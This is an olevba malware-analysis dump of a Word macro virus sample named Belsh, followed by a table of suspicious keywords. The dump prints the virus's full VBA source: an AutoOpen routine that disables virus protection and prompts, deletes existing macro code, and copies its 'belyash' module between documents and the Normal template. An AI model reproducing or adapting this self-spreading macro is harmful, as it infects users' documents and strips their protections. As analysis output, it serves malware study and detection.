olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Belsh-fb56fa2244420e143f8cd1ed10c12da8d7a43f98
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Belsh-fb56fa2244420e143f8cd1ed10c12da8d7a43f98 
in file: Virus.MSWord.Belsh-fb56fa2244420e143f8cd1ed10c12da8d7a43f98 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem"��� �����������"
Rem"��� �����������"
Sub AutoOpen()
On Error Resume Next
Options.ConfirmConversions = 0
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = 0
ActiveDocument.ReadOnlyRecommended = False
WordBasic.DisableAutoMacros -1
Set AD = ActiveDocument.VBProject.VBComponents
Set NT = NormalTemplate.VBProject.VBComponents
InfectedAD = False
InfectedNT = False
For i = 1 To AD.count
If AD(i).Name = "belyash" Then InfectedAD = True
Next i
For T = 1 To NT.count
If NT(T).Name = "belyash" Then InfectedNT = True
Next T
If InfectedAD = True And InfectedNT = True Then Exit Sub
If InfectedAD = False Then
For i = 1 To AD.count
AD(i).CodeModule.DeleteLines 1, AD.VbpojeCt.VBComponents(i).CodeModule.CountOfLines
Next i
NT("belyash").Export (Application.StartUpPath & "\belyash")
AD.import (Application.StartUpPath & "\belyash")
End If
If InfectedNT = False Then
For i = 1 To NT.count
NT(i).CodeModule.DeleteLines 1, NT.VbpojeCt.VBComponents(i).CodeModule.CountOfLines
Next i
AD("belyash").Export (Application.StartUpPath & "\belyash")
NT.import (Application.StartUpPath & "\belyash")
End If
ActiveDocument.ReadOnlyRecommended = False

ActiveDocument.Save
NormalTemplate.Save
 If Options.bluescreen = True Then ShowVisualBasicEditor = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

